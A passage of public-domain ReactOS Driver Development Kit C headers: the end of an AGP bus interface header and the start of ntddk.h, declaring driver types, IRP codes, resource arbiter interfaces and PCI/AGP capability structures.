#define AGP_BUS_INTERFACE_V1                     1
#define AGP_BUS_INTERFACE_V2                     2
#define AGP_BUS_INTERFACE_V3                     3
#define AGP_BUS_INTERFACE_V4                     4
#define AGP_BUS_INTERFACE_V5                     5

/* Indicates wether the GART supports mapping of physical memory for the CPU */
#define AGP_CAPABILITIES_MAP_PHYSICAL            0x00000001
#define AGP_CAPABILITIES_CACHE_COHERENT          0x00000002
#define AGP_CAPABILITIES_REQUIRES_GPU_FLUSH      0x00000004

#define AGP_SET_RATE_DISABLE_SBA                 0x00010000
#define AGP_SET_RATE_DISABLE_FW                  0x00020000

#define AGP_GUARD_PAGE_CHECK_FIRST_ULONG         0x00000001
#define AGP_GUARD_PAGE_CHECK_USE_SAME_OFFSET     0x00000002
#define AGP_GUARD_PAGE_CHECK_DO_NOT_BUGCHECK     0x00000004

#define AGP_BUS_INTERFACE_V1_SIZE (FIELD_OFFSET(AGP_BUS_INTERFACE_STANDARD,SetRate))
#define AGP_BUS_INTERFACE_V2_SIZE (FIELD_OFFSET(AGP_BUS_INTERFACE_STANDARD, AgpSize))
#define AGP_BUS_INTERFACE_V3_SIZE (FIELD_OFFSET(AGP_BUS_INTERFACE_STANDARD, FlushChipsetCaches))
#define AGP_BUS_INTERFACE_V4_SIZE (FIELD_OFFSET(AGP_BUS_INTERFACE_STANDARD, MapMemoryEx))

typedef NTSTATUS
(NTAPI *PAGP_BUS_SET_RATE)(
  IN PVOID AgpContext,
  IN ULONG AgpRate);

typedef NTSTATUS
(NTAPI *PAGP_BUS_RESERVE_MEMORY)(
  IN PVOID AgpContext,
  IN ULONG NumberOfPages,
  IN MEMORY_CACHING_TYPE MemoryType,
  OUT PVOID *MapHandle,
  OUT PHYSICAL_ADDRESS *PhysicalAddress OPTIONAL);

typedef NTSTATUS
(NTAPI *PAGP_BUS_RELEASE_MEMORY)(
  IN PVOID AgpContext,
  IN PVOID MapHandle);

typedef NTSTATUS
(NTAPI *PAGP_BUS_COMMIT_MEMORY)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  IN OUT PMDL Mdl OPTIONAL,
  OUT PHYSICAL_ADDRESS *MemoryBase);

typedef NTSTATUS
(NTAPI *PAGP_BUS_FREE_MEMORY)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages);

typedef NTSTATUS
(NTAPI *PAGP_GET_MAPPED_PAGES)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  OUT PMDL Mdl);

typedef NTSTATUS
(NTAPI *PAGP_MAP_MEMORY)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  IN PMDL Mdl,
  OUT PHYSICAL_ADDRESS *MemoryBase);

typedef NTSTATUS
(NTAPI *PAGP_UNMAP_MEMORY)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  IN PMDL Mdl);

typedef NTSTATUS
(NTAPI *PAGP_FLUSH_CHIPSET_CACHES)(
  IN PVOID AgpContext);

typedef NTSTATUS
(NTAPI *PAGP_CHECK_INTEGRITY)(
  IN PVOID AgpContext);

typedef NTSTATUS
(NTAPI *PAGP_MAP_MEMORY_EX)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  IN PMDL Mdl,
  IN MEMORY_CACHING_TYPE *CacheTypeOverride OPTIONAL,
  OUT PHYSICAL_ADDRESS *MemoryBase);

typedef NTSTATUS
(NTAPI *PAGP_UNMAP_MEMORY_EX)(
  IN PVOID AgpContext,
  IN PVOID MapHandle,
  IN ULONG NumberOfPages,
  IN ULONG OffsetInPages,
  IN PMDL Mdl);

typedef NTSTATUS
(NTAPI *PAGP_FLUSH_GART_TLB)(
  IN PVOID AgpContext);

typedef NTSTATUS
(NTAPI *PAGP_CHECK_GUARD_PAGE)(
  IN PVOID AgpContext,
  IN ULONG Flags,
  IN ULONG ULongsToCheck);

typedef struct _AGP_INFO_COMMON {
  PCI_AGP_CAPABILITY MasterCap;
  PCI_AGP_CAPABILITY TargetCap;
  USHORT DeviceId;
  USHORT VendorId;
  USHORT SubVendorId;
  USHORT SubSystemId;
  UCHAR HwRevisionId;
  ULONG VerifierFlags;
  BOOLEAN GuardPageCorruption;
} AGP_INFO_COMMON, *PAGP_INFO_COMMON;

typedef struct _AGP_INFO_DRIVER {
  ULONG AGPReg1;
  ULONG AGPReg2;
  PHYSICAL_ADDRESS ApertureStart;
  PHYSICAL_ADDRESS GartTranslationTable;
  ULONG ApertureLength;
} AGP_INFO_DRIVER, *PAGP_INFO_DRIVER;

typedef struct _AGP_INFO {
  AGP_INFO_COMMON CommonInfo;
  AGP_INFO_DRIVER DriverInfo;
} AGP_INFO, *PAGP_INFO;

typedef VOID
(NTAPI *PAGP_GET_INFO)(
  IN PVOID AgpContext,
  OUT PAGP_INFO AgpInfo);

typedef struct _AGP_BUS_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID AgpContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  ULONG Capabilities;
  PAGP_BUS_RESERVE_MEMORY ReserveMemory;
  PAGP_BUS_RELEASE_MEMORY ReleaseMemory;
  PAGP_BUS_COMMIT_MEMORY CommitMemory;
  PAGP_BUS_FREE_MEMORY FreeMemory;
  PAGP_GET_MAPPED_PAGES GetMappedPages;
  PAGP_BUS_SET_RATE SetRate;
  SIZE_T AgpSize;
  PHYSICAL_ADDRESS AgpBase;
  PHYSICAL_ADDRESS MaxPhysicalAddress;
  PAGP_MAP_MEMORY MapMemory;
  PAGP_UNMAP_MEMORY UnMapMemory;
  PAGP_FLUSH_CHIPSET_CACHES FlushChipsetCaches;
  PAGP_CHECK_INTEGRITY CheckIntegrity;
  PAGP_MAP_MEMORY_EX  MapMemoryEx;
  PAGP_UNMAP_MEMORY_EX UnMapMemoryEx;
  PAGP_FLUSH_GART_TLB FlushGartTLB;
  PAGP_CHECK_GUARD_PAGE CheckGuardPage;
  PAGP_GET_INFO GetAgpInfo;
} AGP_BUS_INTERFACE_STANDARD, *PAGP_BUS_INTERFACE_STANDARD;

#ifdef __cplusplus
}
#endif

```

`include/ddk/ntddk.h`:

```h
/*
 * ntddk.h
 *
 * Windows NT Device Driver Kit
 *
 * This file is part of the ReactOS DDK package.
 *
 * Contributors:
 *   Amine Khaldi
 *   Timo Kreuzer (timo.kreuzer@reactos.org)
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define _NTDDK_

#if !defined(_NTHAL_) && !defined(_NTIFS_)
#define _NTDDK_INCLUDED_
#define _DDK_DRIVER_
#endif

/* Dependencies */

#define NT_INCLUDED
#define _CTYPE_DISABLE_MACROS

#include <wdm.h>
#include <excpt.h>
#include <ntdef.h>
#include <ntstatus.h>
#include <mce.h>
#include <bugcodes.h>
#include <ntiologc.h>

#include <stdarg.h> // FIXME
#include <basetyps.h> // FIXME


#ifdef __cplusplus
extern "C" {
#endif

/* GUID and UUID */
#ifndef _NTLSA_IFS_
#ifndef _NTLSA_AUDIT_
#define _NTLSA_AUDIT_

#ifndef GUID_DEFINED
#include <guiddef.h>
#endif

#endif /* _NTLSA_AUDIT_ */
#endif /* _NTLSA_IFS_ */

typedef GUID UUID;

struct _LOADER_PARAMETER_BLOCK;
struct _CREATE_DISK;
struct _DRIVE_LAYOUT_INFORMATION_EX;
struct _SET_PARTITION_INFORMATION_EX;
struct _DISK_GEOMETRY_EX;

typedef struct _BUS_HANDLER *PBUS_HANDLER;
typedef struct _DEVICE_HANDLER_OBJECT *PDEVICE_HANDLER_OBJECT;
#if defined(_NTHAL_INCLUDED_)
typedef struct _KAFFINITY_EX *PKAFFINITY_EX;
#endif
typedef struct _PEB *PPEB;

#ifndef _NTIMAGE_

typedef struct _IMAGE_NT_HEADERS *PIMAGE_NT_HEADERS32;
typedef struct _IMAGE_NT_HEADERS64 *PIMAGE_NT_HEADERS64;

#ifdef _WIN64
typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;
#else
typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;
#endif

#endif /* _NTIMAGE_ */

/******************************************************************************
 *                            Executive Types                                 *
 ******************************************************************************/
typedef struct _ZONE_SEGMENT_HEADER {
  SINGLE_LIST_ENTRY SegmentList;
  PVOID Reserved;
} ZONE_SEGMENT_HEADER, *PZONE_SEGMENT_HEADER;

typedef struct _ZONE_HEADER {
  SINGLE_LIST_ENTRY FreeList;
  SINGLE_LIST_ENTRY SegmentList;
  ULONG BlockSize;
  ULONG TotalSegmentSize;
} ZONE_HEADER, *PZONE_HEADER;

#define PROTECTED_POOL                    0x80000000

/******************************************************************************
 *                         I/O Manager Types                                  *
 ******************************************************************************/

/* DEVICE_OBJECT.Flags */
#define DO_DEVICE_HAS_NAME                0x00000040
#define DO_SYSTEM_BOOT_PARTITION          0x00000100
#define DO_LONG_TERM_REQUESTS             0x00000200
#define DO_NEVER_LAST_DEVICE              0x00000400
#define DO_LOW_PRIORITY_FILESYSTEM        0x00010000
#define DO_SUPPORTS_TRANSACTIONS          0x00040000
#define DO_FORCE_NEITHER_IO               0x00080000
#define DO_VOLUME_DEVICE_OBJECT           0x00100000
#define DO_SYSTEM_SYSTEM_PARTITION        0x00200000
#define DO_SYSTEM_CRITICAL_PARTITION      0x00400000
#define DO_DISALLOW_EXECUTE               0x00800000

#ifndef _ARC_DDK_
#define _ARC_DDK_
typedef enum _CONFIGURATION_TYPE {
  ArcSystem,
  CentralProcessor,
  FloatingPointProcessor,
  PrimaryIcache,
  PrimaryDcache,
  SecondaryIcache,
  SecondaryDcache,
  SecondaryCache,
  EisaAdapter,
  TcAdapter,
  ScsiAdapter,
  DtiAdapter,
  MultiFunctionAdapter,
  DiskController,
  TapeController,
  CdromController,
  WormController,
  SerialController,
  NetworkController,
  DisplayController,
  ParallelController,
  PointerController,
  KeyboardController,
  AudioController,
  OtherController,
  DiskPeripheral,
  FloppyDiskPeripheral,
  TapePeripheral,
  ModemPeripheral,
  MonitorPeripheral,
  PrinterPeripheral,
  PointerPeripheral,
  KeyboardPeripheral,
  TerminalPeripheral,
  OtherPeripheral,
  LinePeripheral,
  NetworkPeripheral,
  SystemMemory,
  DockingInformation,
  RealModeIrqRoutingTable,
  RealModePCIEnumeration,
  MaximumType
} CONFIGURATION_TYPE, *PCONFIGURATION_TYPE;
#endif /* !_ARC_DDK_ */

/*
** IRP function codes
*/

#define IRP_MN_QUERY_DIRECTORY            0x01
#define IRP_MN_NOTIFY_CHANGE_DIRECTORY    0x02

#define IRP_MN_USER_FS_REQUEST            0x00
#define IRP_MN_MOUNT_VOLUME               0x01
#define IRP_MN_VERIFY_VOLUME              0x02
#define IRP_MN_LOAD_FILE_SYSTEM           0x03
#define IRP_MN_TRACK_LINK                 0x04
#define IRP_MN_KERNEL_CALL                0x04

#define IRP_MN_LOCK                       0x01
#define IRP_MN_UNLOCK_SINGLE              0x02
#define IRP_MN_UNLOCK_ALL                 0x03
#define IRP_MN_UNLOCK_ALL_BY_KEY          0x04

#define IRP_MN_FLUSH_AND_PURGE          0x01

#define IRP_MN_NORMAL                     0x00
#define IRP_MN_DPC                        0x01
#define IRP_MN_MDL                        0x02
#define IRP_MN_COMPLETE                   0x04
#define IRP_MN_COMPRESSED                 0x08

#define IRP_MN_MDL_DPC                    (IRP_MN_MDL | IRP_MN_DPC)
#define IRP_MN_COMPLETE_MDL               (IRP_MN_COMPLETE | IRP_MN_MDL)
#define IRP_MN_COMPLETE_MDL_DPC           (IRP_MN_COMPLETE_MDL | IRP_MN_DPC)

#define IRP_MN_QUERY_LEGACY_BUS_INFORMATION 0x18

#define IO_CHECK_CREATE_PARAMETERS      0x0200
#define IO_ATTACH_DEVICE                0x0400
#define IO_IGNORE_SHARE_ACCESS_CHECK    0x0800

typedef NTSTATUS
(NTAPI *PIO_QUERY_DEVICE_ROUTINE)(
  IN PVOID Context,
  IN PUNICODE_STRING PathName,
  IN INTERFACE_TYPE BusType,
  IN ULONG BusNumber,
  IN PKEY_VALUE_FULL_INFORMATION *BusInformation,
  IN CONFIGURATION_TYPE ControllerType,
  IN ULONG ControllerNumber,
  IN PKEY_VALUE_FULL_INFORMATION *ControllerInformation,
  IN CONFIGURATION_TYPE PeripheralType,
  IN ULONG PeripheralNumber,
  IN PKEY_VALUE_FULL_INFORMATION *PeripheralInformation);

typedef enum _IO_QUERY_DEVICE_DATA_FORMAT {
  IoQueryDeviceIdentifier = 0,
  IoQueryDeviceConfigurationData,
  IoQueryDeviceComponentInformation,
  IoQueryDeviceMaxData
} IO_QUERY_DEVICE_DATA_FORMAT, *PIO_QUERY_DEVICE_DATA_FORMAT;

typedef VOID
(NTAPI *PDRIVER_REINITIALIZE)(
  IN struct _DRIVER_OBJECT *DriverObject,
  IN PVOID Context OPTIONAL,
  IN ULONG Count);

typedef struct _CONTROLLER_OBJECT {
  CSHORT Type;
  CSHORT Size;
  PVOID ControllerExtension;
  KDEVICE_QUEUE DeviceWaitQueue;
  ULONG Spare1;
  LARGE_INTEGER Spare2;
} CONTROLLER_OBJECT, *PCONTROLLER_OBJECT;

#define DRVO_REINIT_REGISTERED          0x00000008
#define DRVO_INITIALIZED                0x00000010
#define DRVO_BOOTREINIT_REGISTERED      0x00000020
#define DRVO_LEGACY_RESOURCES           0x00000040

typedef struct _CONFIGURATION_INFORMATION {
  ULONG DiskCount;
  ULONG FloppyCount;
  ULONG CdRomCount;
  ULONG TapeCount;
  ULONG ScsiPortCount;
  ULONG SerialCount;
  ULONG ParallelCount;
  BOOLEAN AtDiskPrimaryAddressClaimed;
  BOOLEAN AtDiskSecondaryAddressClaimed;
  ULONG Version;
  ULONG MediumChangerCount;
} CONFIGURATION_INFORMATION, *PCONFIGURATION_INFORMATION;

typedef struct _DISK_SIGNATURE {
  ULONG PartitionStyle;
  _ANONYMOUS_UNION union {
    struct {
      ULONG Signature;
      ULONG CheckSum;
    } Mbr;
    struct {
      GUID DiskId;
    } Gpt;
  } DUMMYUNIONNAME;
} DISK_SIGNATURE, *PDISK_SIGNATURE;

typedef struct _TXN_PARAMETER_BLOCK {
  USHORT Length;
  USHORT TxFsContext;
  PVOID TransactionObject;
} TXN_PARAMETER_BLOCK, *PTXN_PARAMETER_BLOCK;

#define TXF_MINIVERSION_DEFAULT_VIEW        (0xFFFE)

typedef struct _IO_DRIVER_CREATE_CONTEXT {
  CSHORT Size;
  struct _ECP_LIST *ExtraCreateParameter;
  PVOID DeviceObjectHint;
  PTXN_PARAMETER_BLOCK TxnParameters;
} IO_DRIVER_CREATE_CONTEXT, *PIO_DRIVER_CREATE_CONTEXT;

typedef struct _AGP_TARGET_BUS_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PGET_SET_DEVICE_DATA SetBusData;
  PGET_SET_DEVICE_DATA GetBusData;
  UCHAR CapabilityID;
} AGP_TARGET_BUS_INTERFACE_STANDARD, *PAGP_TARGET_BUS_INTERFACE_STANDARD;

typedef NTSTATUS
(NTAPI *PGET_LOCATION_STRING)(
  IN OUT PVOID Context OPTIONAL,
  OUT PWCHAR *LocationStrings);

typedef struct _PNP_LOCATION_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PGET_LOCATION_STRING GetLocationString;
} PNP_LOCATION_INTERFACE, *PPNP_LOCATION_INTERFACE;

typedef enum _ARBITER_ACTION {
  ArbiterActionTestAllocation,
  ArbiterActionRetestAllocation,
  ArbiterActionCommitAllocation,
  ArbiterActionRollbackAllocation,
  ArbiterActionQueryAllocatedResources,
  ArbiterActionWriteReservedResources,
  ArbiterActionQueryConflict,
  ArbiterActionQueryArbitrate,
  ArbiterActionAddReserved,
  ArbiterActionBootAllocation
} ARBITER_ACTION, *PARBITER_ACTION;

typedef struct _ARBITER_CONFLICT_INFO {
  PDEVICE_OBJECT OwningObject;
  ULONGLONG Start;
  ULONGLONG End;
} ARBITER_CONFLICT_INFO, *PARBITER_CONFLICT_INFO;

typedef struct _ARBITER_TEST_ALLOCATION_PARAMETERS {
  IN OUT PLIST_ENTRY ArbitrationList;
  IN ULONG AllocateFromCount;
  IN PCM_PARTIAL_RESOURCE_DESCRIPTOR AllocateFrom;
} ARBITER_TEST_ALLOCATION_PARAMETERS, *PARBITER_TEST_ALLOCATION_PARAMETERS;

typedef struct _ARBITER_RETEST_ALLOCATION_PARAMETERS {
  IN OUT PLIST_ENTRY ArbitrationList;
  IN ULONG AllocateFromCount;
  IN PCM_PARTIAL_RESOURCE_DESCRIPTOR AllocateFrom;
} ARBITER_RETEST_ALLOCATION_PARAMETERS, *PARBITER_RETEST_ALLOCATION_PARAMETERS;

typedef struct _ARBITER_BOOT_ALLOCATION_PARAMETERS {
  IN OUT PLIST_ENTRY ArbitrationList;
} ARBITER_BOOT_ALLOCATION_PARAMETERS, *PARBITER_BOOT_ALLOCATION_PARAMETERS;

typedef struct _ARBITER_QUERY_ALLOCATED_RESOURCES_PARAMETERS {
  OUT PCM_PARTIAL_RESOURCE_LIST *AllocatedResources;
} ARBITER_QUERY_ALLOCATED_RESOURCES_PARAMETERS, *PARBITER_QUERY_ALLOCATED_RESOURCES_PARAMETERS;

typedef struct _ARBITER_QUERY_CONFLICT_PARAMETERS {
  IN PDEVICE_OBJECT PhysicalDeviceObject;
  IN PIO_RESOURCE_DESCRIPTOR ConflictingResource;
  OUT PULONG ConflictCount;
  OUT PARBITER_CONFLICT_INFO *Conflicts;
} ARBITER_QUERY_CONFLICT_PARAMETERS, *PARBITER_QUERY_CONFLICT_PARAMETERS;

typedef struct _ARBITER_QUERY_ARBITRATE_PARAMETERS {
  IN PLIST_ENTRY ArbitrationList;
} ARBITER_QUERY_ARBITRATE_PARAMETERS, *PARBITER_QUERY_ARBITRATE_PARAMETERS;

typedef struct _ARBITER_ADD_RESERVED_PARAMETERS {
  IN PDEVICE_OBJECT ReserveDevice;
} ARBITER_ADD_RESERVED_PARAMETERS, *PARBITER_ADD_RESERVED_PARAMETERS;

typedef struct _ARBITER_PARAMETERS {
  union {
    ARBITER_TEST_ALLOCATION_PARAMETERS TestAllocation;
    ARBITER_RETEST_ALLOCATION_PARAMETERS RetestAllocation;
    ARBITER_BOOT_ALLOCATION_PARAMETERS BootAllocation;
    ARBITER_QUERY_ALLOCATED_RESOURCES_PARAMETERS QueryAllocatedResources;
    ARBITER_QUERY_CONFLICT_PARAMETERS QueryConflict;
    ARBITER_QUERY_ARBITRATE_PARAMETERS QueryArbitrate;
    ARBITER_ADD_RESERVED_PARAMETERS AddReserved;
  } Parameters;
} ARBITER_PARAMETERS, *PARBITER_PARAMETERS;

typedef enum _ARBITER_REQUEST_SOURCE {
  ArbiterRequestUndefined = -1,
  ArbiterRequestLegacyReported,
  ArbiterRequestHalReported,
  ArbiterRequestLegacyAssigned,
  ArbiterRequestPnpDetected,
  ArbiterRequestPnpEnumerated
} ARBITER_REQUEST_SOURCE;

typedef enum _ARBITER_RESULT {
  ArbiterResultUndefined = -1,
  ArbiterResultSuccess,
  ArbiterResultExternalConflict,
  ArbiterResultNullRequest
} ARBITER_RESULT;

#define ARBITER_FLAG_BOOT_CONFIG 0x00000001

typedef struct _ARBITER_LIST_ENTRY {
  LIST_ENTRY ListEntry;
  ULONG AlternativeCount;
  PIO_RESOURCE_DESCRIPTOR Alternatives;
  PDEVICE_OBJECT PhysicalDeviceObject;
  ARBITER_REQUEST_SOURCE RequestSource;
  ULONG Flags;
  LONG_PTR WorkSpace;
  INTERFACE_TYPE InterfaceType;
  ULONG SlotNumber;
  ULONG BusNumber;
  PCM_PARTIAL_RESOURCE_DESCRIPTOR Assignment;
  PIO_RESOURCE_DESCRIPTOR SelectedAlternative;
  ARBITER_RESULT Result;
} ARBITER_LIST_ENTRY, *PARBITER_LIST_ENTRY;

typedef NTSTATUS
(NTAPI *PARBITER_HANDLER)(
  IN OUT PVOID Context,
  IN ARBITER_ACTION Action,
  IN OUT PARBITER_PARAMETERS Parameters);

#define ARBITER_PARTIAL 0x00000001

typedef struct _ARBITER_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PARBITER_HANDLER ArbiterHandler;
  ULONG Flags;
} ARBITER_INTERFACE, *PARBITER_INTERFACE;

typedef enum _RESOURCE_TRANSLATION_DIRECTION {
  TranslateChildToParent,
  TranslateParentToChild
} RESOURCE_TRANSLATION_DIRECTION;

typedef NTSTATUS
(NTAPI *PTRANSLATE_RESOURCE_HANDLER)(
  IN OUT PVOID Context OPTIONAL,
  IN PCM_PARTIAL_RESOURCE_DESCRIPTOR Source,
  IN RESOURCE_TRANSLATION_DIRECTION Direction,
  IN ULONG AlternativesCount OPTIONAL,
  IN IO_RESOURCE_DESCRIPTOR Alternatives[],
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  OUT PCM_PARTIAL_RESOURCE_DESCRIPTOR Target);

typedef NTSTATUS
(NTAPI *PTRANSLATE_RESOURCE_REQUIREMENTS_HANDLER)(
  IN OUT PVOID Context OPTIONAL,
  IN PIO_RESOURCE_DESCRIPTOR Source,
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  OUT PULONG TargetCount,
  OUT PIO_RESOURCE_DESCRIPTOR *Target);

typedef struct _TRANSLATOR_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PTRANSLATE_RESOURCE_HANDLER TranslateResources;
  PTRANSLATE_RESOURCE_REQUIREMENTS_HANDLER TranslateResourceRequirements;
} TRANSLATOR_INTERFACE, *PTRANSLATOR_INTERFACE;

typedef struct _PCI_AGP_CAPABILITY {
  PCI_CAPABILITIES_HEADER Header;
  USHORT Minor:4;
  USHORT Major:4;
  USHORT Rsvd1:8;
  struct _PCI_AGP_STATUS {
    ULONG Rate:3;
    ULONG Agp3Mode:1;
    ULONG FastWrite:1;
    ULONG FourGB:1;
    ULONG HostTransDisable:1;
    ULONG Gart64:1;
    ULONG ITA_Coherent:1;
    ULONG SideBandAddressing:1;
    ULONG CalibrationCycle:3;
    ULONG AsyncRequestSize:3;
    ULONG Rsvd1:1;
    ULONG Isoch:1;
    ULONG Rsvd2:6;
    ULONG RequestQueueDepthMaximum:8;
  } AGPStatus;
  struct _PCI_AGP_COMMAND {
    ULONG Rate:3;
    ULONG Rsvd1:1;
    ULONG FastWriteEnable:1;
    ULONG FourGBEnable:1;
    ULONG Rsvd2:1;
    ULONG Gart64:1;
    ULONG AGPEnable:1;
    ULONG SBAEnable:1;
    ULONG CalibrationCycle:3;
    ULONG AsyncReqSize:3;
    ULONG Rsvd3:8;
    ULONG RequestQueueDepth:8;
  } AGPCommand;
} PCI_AGP_CAPABILITY, *PPCI_AGP_CAPABILITY;

typedef enum _EXTENDED_AGP_REGISTER {
  IsochStatus,
  AgpControl,
  ApertureSize,
  AperturePageSize,
  GartLow,
  GartHigh,
  IsochCommand
} EXTENDED_AGP_REGISTER, *PEXTENDED_AGP_REGISTER;

typedef struct _PCI_AGP_ISOCH_STATUS {
  ULONG ErrorCode:2;
  ULONG Rsvd1:1;
  ULONG Isoch_L:3;
  ULONG Isoch_Y:2;
  ULONG Isoch_N:8;
  ULONG Rsvd2:16;
} PCI_AGP_ISOCH_STATUS, *PPCI_AGP_ISOCH_STATUS;

typedef struct _PCI_AGP_CONTROL {
  ULONG Rsvd1:7;
  ULONG GTLB_Enable:1;
  ULONG AP_Enable:1;
  ULONG CAL_Disable:1;
  ULONG Rsvd2:22;
} PCI_AGP_CONTROL, *PPCI_AGP_CONTROL;

typedef struct _PCI_AGP_APERTURE_PAGE_SIZE {
  USHORT PageSizeMask:11;
  USHORT Rsvd1:1;
  USHORT PageSizeSelect:4;
} PCI_AGP_APERTURE_PAGE_SIZE, *PPCI_AGP_APERTURE_PAGE_SIZE;

typedef struct _PCI_AGP_ISOCH_COMMAND {
  USHORT Rsvd1:6;
  USHORT Isoch_Y:2;
  USHORT Isoch_N:8;
} PCI_AGP_ISOCH_COMMAND, *PPCI_AGP_ISOCH_COMMAND;

typedef struct PCI_AGP_EXTENDED_CAPABILITY {
  PCI_AGP_ISOCH_STATUS IsochStatus;
  PCI_AGP_CONTROL AgpControl;
  USHORT ApertureSize;
  PCI_AGP_APERTURE_PAGE_SIZE AperturePageSize;
  ULONG GartLow;
  ULONG GartHigh;
  PCI_AGP_ISOCH_COMMAND IsochCommand;
} PCI_AGP_EXTENDED_CAPABILITY, *PPCI_AGP_EXTENDED_CAPABILITY;

#define PCI_AGP_RATE_1X     0x1
#define PCI_AGP_RATE_2X     0x2
#define PCI_AGP_RATE_4X     0x4

#define PCIX_MODE_CONVENTIONAL_PCI  0x0
#define PCIX_MODE1_66MHZ            0x1
#define PCIX_MODE1_100MHZ           0x2
#define PCIX_MODE1_133MHZ           0x3
#define PCIX_MODE2_266_66MHZ        0x9
#define PCIX_MODE2_266_100MHZ       0xA
#define PCIX_MODE2_266_133MHZ       0xB
#define PCIX_MODE2_533_66MHZ        0xD
#define PCIX_MODE2_533_100MHZ       0xE
#define PCIX_MODE2_533_133MHZ       0xF

#define PCIX_VERSION_MODE1_ONLY     0x0
#define PCIX_VERSION_MODE2_ECC      0x1
#define PCIX_VERSION_DUAL_MODE_ECC  0x2

typedef struct _PCIX_BRIDGE_CAPABILITY {
  PCI_CAPABILITIES_HEADER Header;
  union {
    _ANONYMOUS_STRUCT struct {
      USHORT Bus64Bit:1;
      USHORT Bus133MHzCapable:1;
      USHORT SplitCompletionDiscarded:1;
      USHORT UnexpectedSplitCompletion:1;
      USHORT SplitCompletionOverrun:1;
      USHORT SplitRequestDelayed:1;
      USHORT BusModeFrequency:4;
      USHORT Rsvd:2;
      USHORT Version:2;
      USHORT Bus266MHzCapable:1;
      USHORT Bus533MHzCapable:1;
    } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
  } SecondaryStatus;
  union {
    _ANONYMOUS_STRUCT struct {
      ULONG FunctionNumber:3;
      ULONG DeviceNumber:5;
      ULONG BusNumber:8;
      ULONG Device64Bit:1;
      ULONG Device133MHzCapable:1;
      ULONG SplitCompletionDiscarded:1;
      ULONG UnexpectedSplitCompletion:1;
      ULONG SplitCompletionOverrun:1;
      ULONG SplitRequestDelayed:1;
      ULONG Rsvd:7;
      ULONG DIMCapable:1;
      ULONG Device266MHzCapable:1;
      ULONG Device533MHzCapable:1;
    } DUMMYSTRUCTNAME;
    ULONG AsULONG;
  } BridgeStatus;
  USHORT UpstreamSplitTransactionCapacity;
  USHORT UpstreamSplitTransactionLimit;
  USHORT DownstreamSplitTransactionCapacity;
  USHORT DownstreamSplitTransactionLimit;
  union {
    _ANONYMOUS_STRUCT struct {
      ULONG SelectSecondaryRegisters:1;
      ULONG ErrorPresentInOtherBank:1;
      ULONG AdditionalCorrectableError:1;
      ULONG AdditionalUncorrectableError:1;
      ULONG ErrorPhase:3;
      ULONG ErrorCorrected:1;
      ULONG Syndrome:8;
      ULONG ErrorFirstCommand:4;
      ULONG ErrorSecondCommand:4;
      ULONG ErrorUpperAttributes:4;
      ULONG ControlUpdateEnable:1;
      ULONG Rsvd:1;
      ULONG DisableSingleBitCorrection:1;
      ULONG EccMode:1;
    } DUMMYSTRUCTNAME;
  ULONG AsULONG;
  } EccControlStatus;
  ULONG EccFirstAddress;
  ULONG EccSecondAddress;
  ULONG EccAttribute;
} PCIX_BRIDGE_CAPABILITY, *PPCIX_BRIDGE_CAPABILITY;

typedef struct _PCI_SUBSYSTEM_IDS_CAPABILITY {
  PCI_CAPABILITIES_HEADER Header;
  USHORT Reserved;
  USHORT SubVendorID;
  USHORT SubSystemID;
} PCI_SUBSYSTEM_IDS_CAPABILITY, *PPCI_SUBSYSTEM_IDS_CAPABILITY;

#define OSC_FIRMWARE_FAILURE                            0x02
#define OSC_UNRECOGNIZED_UUID                           0x04
#define OSC_UNRECOGNIZED_REVISION                       0x08
#define OSC_CAPABILITIES_MASKED                         0x10

#define PCI_ROOT_BUS_OSC_METHOD_CAPABILITY_REVISION     0x01

typedef struct _PCI_ROOT_BUS_OSC_SUPPORT_FIELD {
  union {
    _ANONYMOUS_STRUCT struct {
      ULONG ExtendedConfigOpRegions:1;
      ULONG ActiveStatePowerManagement:1;
      ULONG ClockPowerManagement:1;
      ULONG SegmentGroups:1;
      ULONG MessageSignaledInterrupts:1;
      ULONG WindowsHardwareErrorArchitecture:1;
      ULONG Reserved:26;
    } DUMMYSTRUCTNAME;
    ULONG AsULONG;
  } u;
} PCI_ROOT_BUS_OSC_SUPPORT_FIELD, *PPCI_ROOT_BUS_OSC_SUPPORT_FIELD;

typedef struct _PCI_ROOT_BUS_OSC_CONTROL_FIELD {
  union {
    _ANONYMOUS_STRUCT struct {
      ULONG ExpressNativeHotPlug:1;
